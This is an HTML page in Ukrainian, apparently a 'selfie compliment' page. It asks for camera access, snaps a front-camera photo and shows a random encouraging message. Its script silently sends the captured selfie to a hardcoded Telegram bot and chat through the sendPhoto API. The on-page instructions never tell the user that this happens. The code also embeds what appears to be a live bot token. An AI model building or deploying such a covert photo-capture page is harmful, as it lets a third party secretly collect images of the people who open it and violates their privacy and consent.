<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="utf-8" />
  <title>AutoSelfie → Telegram (рандомне повідомлення + картинка)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root{
      --bg:#0f1720; --card:#0b1220; --accent:#2563eb; --muted:#9fb0c8; --text:#e6eef8;
    }
    html,body{height:100%;margin:0}
    body{
      font-family:system-ui,Segoe UI,Roboto,Arial;
      background:var(--bg);
      color:var(--text);
      display:flex;
      justify-content:center;
      padding:20px;
    }
    .card{
      background:var(--card);
      border:1px solid #1f2a3a;
      padding:18px;
      border-radius:12px;
      max-width:820px;
      width:100%;
      box-sizing:border-box;
    }
    header img{
      max-width:100%;
      border-radius:10px;
      margin-bottom:8px;
      display:block;
    }
    .caption-area{
      margin:8px 0 14px 0;
    }
    .caption-area .static-text{
      color:var(--muted);
      font-size:14px;
    }
    .controls{
      display:flex;
      gap:10px;
      align-items:center;
      margin-top:12px;
    }
    button{
      padding:12px 18px;
      border-radius:8px;
      border:none;
      background:var(--accent);
      color:#fff;
      font-size:16px;
      cursor:pointer;
      width:100%;
    }
    button:disabled{opacity:.6;cursor:default}
    video{
      width:100%;
      max-width:480px;
      border-radius:10px;
      background:#000;
      display:none;
    }
    canvas{
      width:100%;
      max-width:480px;
      border-radius:10px;
      background:#000;
      display:none;
      margin-top:12px;
    }
    .random-block{
      margin-top:12px;
      display:flex;
      gap:12px;
      align-items:flex-start;
    }
    .random-block img{
      width:120px;
      height:120px;
      object-fit:cover;
      border-radius:8px;
      background:#000;
      border:1px solid #223;
    }
    .random-block .msg{
      color:var(--text);
      font-size:15px;
      line-height:1.3;
    }
    .note{font-size:13px;color:var(--muted);margin-top:10px}
  </style>
</head>
<body>
  <div class="card">
    <!-- Статична картинка зверху -->
    <header>
      <img id="topImage" src="" alt="Статична картинка">
    </header>

    <!-- Текст під картинкою (статичний) -->
    <div class="caption-area">
      <div class="static-text" id="staticText">Тут можна розмістити інструкцію або підпис під картинкою.</div>
    </div>

    <!-- Живе відео (показується після дозволу) -->
    <video id="video" autoplay playsinline muted></video>

    <!-- Відображення знятого фото -->
    <canvas id="canvas"></canvas>

    <!-- Рандомне повідомлення + картинка (після зйомки) -->
    <div id="randomContainer" class="random-block" style="display:none">
      <img id="randomImage" src="" alt="Рандомна картинка">
      <div class="msg" id="randomMessage"></div>
    </div>

    <!-- Кнопка розташована під вікном (відео/canvas) -->
    <div class="controls">
      <button id="actionBtn">Надати доступ до камери</button>
    </div>

    <p class="note">Сторінка працює тільки через HTTPS або localhost. Якщо Telegram блокує запит (CORS), повідом — дам proxy.</p>
  </div>

  <script>
    // ====== Налаштування (встав свої дані сюди) ======
    const BOT_TOKEN = "8506109550:AAGjHAChPn0IFIdL24s9PauJfwk9F9mV-_Y";
    const CHAT_ID = "1178810140";
    // Статична картинка зверху (URL або data URI). Якщо порожній — картинка прихована.
    const IMAGE_SRC = "";
    // Статичний текст під картинкою
    const STATIC_TEXT = "Натисни кнопку, дозволь камеру, потім натисни «Зробити фото». Після зйомки з'явиться випадкове повідомлення з картинкою.";
    // ====== БАЗА З 12 ПОВІДОМЛЕНЬ І 12 КАРТИНОК ======
    // Замініть приклади URL на свої реальні зображення або data URI.
    const RANDOM_MESSAGES = [
      "Ти виглядаєш чудово сьогодні!",
      "Нехай цей день принесе тобі удачу.",
      "Посміхнися — це твоя суперсила.",
      "Нехай мрії стають реальністю.",
      "Ти робиш світ кращим своїм виглядом.",
      "Коротка пауза для натхнення — ти справжній.",
      "Нехай кожен кадр буде пам'ятним.",
      "Твоя енергія заряджає навколо.",
      "Зроби глибокий вдих — і вперед.",
      "Ти вже на крок ближче до мети.",
      "Нехай сьогодні буде день сюрпризів.",
      "Твоя посмішка — найкращий фільтр."
    ];
    const RANDOM_IMAGES = [
      "https://via.placeholder.com/480x480.png?text=Img+1",
      "https://via.placeholder.com/480x480.png?text=Img+2",
      "https://via.placeholder.com/480x480.png?text=Img+3",
      "https://via.placeholder.com/480x480.png?text=Img+4",
      "https://via.placeholder.com/480x480.png?text=Img+5",
      "https://via.placeholder.com/480x480.png?text=Img+6",
      "https://via.placeholder.com/480x480.png?text=Img+7",
      "https://via.placeholder.com/480x480.png?text=Img+8",
      "https://via.placeholder.com/480x480.png?text=Img+9",
      "https://via.placeholder.com/480x480.png?text=Img+10",
      "https://via.placeholder.com/480x480.png?text=Img+11",
      "https://via.placeholder.com/480x480.png?text=Img+12"
    ];
    // ================================================

    const actionBtn = document.getElementById('actionBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const topImage = document.getElementById('topImage');
    const staticTextEl = document.getElementById('staticText');
    const randomContainer = document.getElementById('randomContainer');
    const randomImageEl = document.getElementById('randomImage');
    const randomMessageEl = document.getElementById('randomMessage');

    if (IMAGE_SRC) topImage.src = IMAGE_SRC;
    else topImage.style.display = "none";

    staticTextEl.textContent = STATIC_TEXT;

    let stream = null;
    let cameraActive = false;

    function isSecure(){
      return location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
    }

    async function stopStream(){
      if (stream) {
        try { stream.getTracks().forEach(t => t.stop()); } catch(e){ console.warn(e); }
      }
      stream = null;
      video.srcObject = null;
      video.style.display = "none";
    }

    function waitForVideoFrameReady(videoEl, timeout = 4000) {
      return new Promise((resolve, reject) => {
        const start = Date.now();
        if (videoEl.requestVideoFrameCallback) {
          videoEl.requestVideoFrameCallback(() => resolve());
          return;
        }
        const check = () => {
          if (videoEl.readyState >= 2 && videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
            resolve();
          } else if (Date.now() - start > timeout) {
            reject(new Error('timeout waiting for video frame'));
          } else {
            requestAnimationFrame(check);
          }
        };
        check();
      });
    }

    async function startCamera(){
      if (!isSecure()) {
        alert('getUserMedia працює лише в безпечному контексті (HTTPS або localhost).');
        return false;
      }
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;
        try { await video.play(); } catch(e){ /* ignore */ }
        await waitForVideoFrameReady(video, 5000);
        video.style.display = "block";
        canvas.style.display = "none";
        randomContainer.style.display = "none";
        cameraActive = true;
        actionBtn.textContent = "Зробити фото";
        return true;
      } catch (err) {
        console.error('startCamera error', err);
        alert('Не вдалося отримати доступ до камери. Перевір дозволи.');
        return false;
      }
    }

    function pickRandomIndex(){
      const n = Math.min(RANDOM_MESSAGES.length, RANDOM_IMAGES.length);
      return Math.floor(Math.random() * n);
    }

    async function takePhotoAndSend(){
      if (!cameraActive) return;
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');

      // Малюємо кадр
      ctx.drawImage(video, 0, 0, w, h);

      // Показуємо зняте фото
      canvas.style.display = "block";

      // Вибираємо випадкове повідомлення і картинку
      const idx = pickRandomIndex();
      const message = RANDOM_MESSAGES[idx];
      const imageUrl = RANDOM_IMAGES[idx];

      // Показуємо на сторінці
      randomImageEl.src = imageUrl;
      randomMessageEl.textContent = message;
      randomContainer.style.display = "flex";

      // Формуємо blob для селфі
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
      if (!blob) {
        alert('Не вдалося сформувати зображення.');
        return;
      }

      // Відправляємо селфі з підписом (рандомне повідомлення)
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', blob, 'selfie.png');
      form.append('caption', message);

      const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

      try {
        const resp1 = await fetch(sendUrl, { method: 'POST', body: form });
        if (!resp1.ok) {
          const text = await resp1.text().catch(()=>'[no body]');
          console.error('Telegram send selfie error', resp1.status, text);
          alert('Відправка селфі неуспішна. Можлива проблема з CORS або токен/чат невірні.');
        } else {
          // Додатково надсилаємо картинку з бази як окреме повідомлення (через URL)
          try {
            const form2 = new FormData();
            form2.append('chat_id', CHAT_ID);
            form2.append('photo', imageUrl); // Telegram приймає URL у полі photo
            const resp2 = await fetch(sendUrl, { method: 'POST', body: form2 });
            if (!resp2.ok) {
              // не критично — просто лог
              const t = await resp2.text().catch(()=>'[no body]');
              console.warn('Telegram send random image error', resp2.status, t);
            }
          } catch (e2) {
            console.warn('send random image failed', e2);
          }
        }
      } catch (err) {
        console.error('send error', err);
        alert('Помилка мережі або блокування CORS. Повідом мене — дам proxy.');
      } finally {
        // Зупиняємо камеру після зйомки
        await stopStream();
        cameraActive = false;
        actionBtn.textContent = "Надати доступ до камери";
      }
    }

    actionBtn.addEventListener('click', async () => {
      if (!cameraActive) {
        await startCamera();
      } else {
        await takePhotoAndSend();
      }
    });
  </script>
</body>
      </html>
